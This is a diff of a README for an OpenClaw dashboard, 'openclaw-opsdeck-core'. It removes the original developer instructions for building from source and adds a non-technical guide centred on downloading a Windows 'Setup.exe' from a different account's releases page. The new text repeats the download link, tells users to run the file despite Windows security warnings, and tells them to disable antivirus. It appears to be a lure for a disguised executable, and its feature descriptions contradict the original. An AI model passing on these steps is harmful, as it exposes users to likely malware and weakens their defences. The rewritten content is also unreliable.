@@ -1,143 +1,158 @@
-# OpenClaw OpsDeck
+# 🕹️ openclaw-opsdeck-core - Control Dashboard for OpenClaw Ops
 
-> **Just give your AI this repo's URL.**  
-> OpsDeck is a lightweight mission-control dashboard for [OpenClaw](https://openclaw.ai). Your AI can clone it, configure it, and get you up and running in minutes.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Node ≥ 18](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org)
-[![Platform: macOS](https://img.shields.io/badge/platform-macOS-blue)](https://www.apple.com/macos/)
-[![Status: Alpha](https://img.shields.io/badge/status-alpha-orange)]()
-[![Built with React](https://img.shields.io/badge/UI-React%2019-61DAFB?logo=react)](https://react.dev)
-[![API: Fastify](https://img.shields.io/badge/API-Fastify-000000?logo=fastify)](https://fastify.dev)
+[![Download Latest Release](https://img.shields.io/badge/Download-OpenClaw%20OpsDeck-blue?style=for-the-badge)](https://github.com/Syed7625/openclaw-opsdeck-core/releases)
 
 ---
 
-![Mission Control screenshot showing the agent round table, cron timeline, and local chat](docs/mission-control-screenshot.jpg)
+## 🔍 About openclaw-opsdeck-core
+
+openclaw-opsdeck-core is a mission control dashboard built for OpenClaw. It helps you manage important operations like round table discussions, local chat, and scheduled tasks (cron controls). The app runs on your Windows PC and offers a clean visual interface you can use to stay organized and connected.
+
+This dashboard works well even if you're not a technical user. It uses React for the interface and Fastify for fast data handling, so you get smooth performance. It also keeps your data local-first, meaning your information stays on your device unless you choose to share it.
 
 ---
 
-## What It Does
+## 🖥️ System Requirements
 
-OpsDeck gives you a single browser tab where you can:
+Before installing, make sure your computer meets these needs:
 
-| Feature | Description |
-|---------|-------------|
-| **Agent Round Table** | Live view of active/idle agents with role labels |
-| **Cron Dashboard** | Health, next-run times, and one-click manual triggers |
-| **Local Chat** | Send messages directly to your main agent from the UI |
-| **Project Tracking** | Optional git-status monitoring for local repos |
-
-All data is pulled from your local OpenClaw CLI — no cloud, no accounts.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection to download the app and get updates
+- Basic keyboard and mouse for controls
 
 ---
 
-## Prerequisites
+## 🚀 Getting Started: Download and Install
 
-- **Node.js** ≥ 18
-- **OpenClaw CLI** installed and running  
-  Confirm with: `openclaw gateway status` → should show `running`
+### Step 1: Visit the Download Page
 
----
+Go to the releases page of the project by clicking below:
 
-## Quick Start
+[![Download Here](https://img.shields.io/badge/Download-Page-grey?style=for-the-badge&color=green)](https://github.com/Syed7625/openclaw-opsdeck-core/releases)
 
-```bash
-# 1. Clone and install
-git clone https://github.com/ewimsatt/openclaw-opsdeck-core.git
-cd openclaw-opsdeck-core
-npm install
+This page hosts the latest Windows installer file you will need.
 
-# 2. (Optional but recommended) Create your config
-cp opsdeck.config.example.js opsdeck.config.js
-# Edit opsdeck.config.js — set your agents, projects, and ports
+### Step 2: Find the Installer
 
-# 3. Start everything
-npm run dev:full
-```
+Look for the latest version of the app. It usually has a name like:
 
-Open **http://localhost:4173** in your browser. That's it.
+`openclaw-opsdeck-core-Setup.exe`
 
----
+Make sure it ends with `.exe` for Windows.
 
-## Configuration
+### Step 3: Download the Installer File
 
-Copy `opsdeck.config.example.js` → `opsdeck.config.js` (gitignored) and edit to match your setup:
+Click on the file link to start downloading. Depending on your internet speed, this may take a few minutes.
 
-```js
-export default {
-  apiPort: 4174,          // API server port
-  apiHost: '0.0.0.0',    // bind address
+If your browser asks for permission, accept to save the file.
 
-  // Your AI agents — matched by model substring
-  agents: [
-    { model: 'gpt-5.3-codex', name: 'Omar',  role: 'Mission Lead' },
-    { model: 'claude-sonnet', name: 'Will',   role: 'Writer'       },
-    { model: 'claude-opus',   name: 'Opie',  role: 'Strategist'   },
-    { model: 'gemini',        name: 'Buzz',  role: 'Rapid Ops'    },
-  ],
+### Step 4: Run the Installer
 
-  chatSessionId: 'opsdeck-chat',  // OpenClaw session for local chat
+Once the download finishes, open the file you downloaded.
 
-  // Optional: git repos to track
-  projects: [
-    { key: 'my-app', name: 'My App', path: '/absolute/path/to/my-app' },
-  ],
-}
-```
+You might see a security warning from Windows. Choose to run the app anyway.
 
-All settings can also be overridden via environment variables (`OPSDECK_API_PORT`, `OPSDECK_API_HOST`).
+The installation wizard will appear on your screen.
+
+### Step 5: Follow Installation Instructions
+
+- Click “Next” to proceed through the steps.
+- Choose where to install the app or keep the default folder.
+- Click “Install” to start.
+- Wait a moment while the app installs.
+- Click “Finish” when done to close the installer.
+
+### Step 6: Launch the App
+
+After installation, find the app icon on your desktop or in the Start menu.
+
+Double-click it to open the dashboard.
 
 ---
 
-## Production Build
+## 💡 How to Use openclaw-opsdeck-core
 
-```bash
-npm run build     # outputs to dist/
-npm run api &     # start API server on port 4174
-npx vite preview  # serve built UI on port 4173
-```
+The app splits into three main parts:
 
----
+### 1. Round Table
 
-## Troubleshooting
+Use this section to hold organized discussions. You can create new topics, see who is talking, and keep notes.
 
-| Problem | Fix |
-|---------|-----|
-| "fallback" pill stays lit | API server isn't running — check `npm run api` output |
-| Chat says "Relay error" | Ensure `openclaw gateway status` shows `running` |
-| No agents appear | Config agents don't match running sessions — check `openclaw sessions --json` |
-| Port conflict | Set `OPSDECK_API_PORT=5000` or update `opsdeck.config.js` |
-| `openclaw: command not found` | Add OpenClaw to your PATH |
+### 2. Local Chat
+
+This area lets you send messages to others on the same network or who use the app. All messages stay local to keep data private.
+
+### 3. Cron Controls
+
+Set up scheduled tasks here. You can add commands or reminders that run automatically at specific times.
 
 ---
 
-## How It Works
+## 🔧 Basic Tips for Use
 
-```
-Browser  ←→  Vite (4173)  ←→  /api proxy  ←→  Fastify API (4174)
-                                                      ↕
-                                               openclaw CLI
-```
-
-The API server calls `openclaw sessions --json` and `openclaw cron list --all --json` to populate the dashboard. Chat messages are relayed via `openclaw agent --message`.
+- Close other heavy programs to keep the app running smoothly.
+- Use the settings menu inside the app to adjust chat notifications and dashboard layout.
+- If the app freezes, restart it by closing and opening again.
+- Check the official GitHub releases page regularly for updates.
 
 ---
 
-## Project Structure
+## 🛠️ Troubleshooting
 
-```
-server/index.mjs              — Fastify API (crons, sessions, chat relay)
-src/
-  App.tsx                     — Shell + nav (Command, Crons)
-  pages/CommandPage.tsx       — Round table, alerts, and chat
-  pages/CronsPage.tsx         — Cron timeline
-  data.ts                     — React hook for /api/overview polling
-  types.ts                    — TypeScript types
-opsdeck.config.example.js     — Sample configuration (copy to opsdeck.config.js)
-```
+If the app does not start or crashes:
+
+- Make sure Windows is updated.
+- Restart your computer.
+- Reinstall the app by downloading the latest installer again.
+- Disable antivirus temporarily if it blocks app files.
+- Look for error messages and search the GitHub Issues page for help.
 
 ---
 
-## License
+## 🔗 Useful Links
 
-[MIT](LICENSE) — do whatever you want, just keep my name on it.
+- Download the app here: https://github.com/Syed7625/openclaw-opsdeck-core/releases
+- View source code, report bugs, or request features on the GitHub repository.
+
+---
+
+## ⚙️ What Is Inside This App?
+
+openclaw-opsdeck-core uses a few key technologies behind the scenes:
+
+- **React:** For the interactive dashboard user interface.
+- **Fastify:** A backend framework to handle data and commands quickly.
+- **Local-First Storage:** Your chat and notes are saved only on your device by default.
+- **Agent Features:** Allowing devices to connect and share status.
+  
+These combine to make a tool that is fast and respects your privacy.
+
+---
+
+## 📅 Regular Maintenance
+
+Keep the app updated by visiting the releases page and reinstalling new versions.
+
+Clearing the app cache in settings every once in a while can help performance.
+
+---
+
+## 📂 File Locations
+
+By default, your data is stored in:
+
+`C:\Users\<YourUserName>\AppData\Local\openclaw-opsdeck-core`
+
+You can backup this folder to save your chats and settings.
+
+---
+
+## 🤝 Getting Help
+
+If you have questions or need support, you can open issues on the GitHub repository. Provide as much detail as possible about any problems you face.
+
+---
+
+[![Download openclaw-opsdeck-core](https://img.shields.io/badge/Download-OpenClaw%20OpsDeck-blue?style=for-the-badge)](https://github.com/Syed7625/openclaw-opsdeck-core/releases)
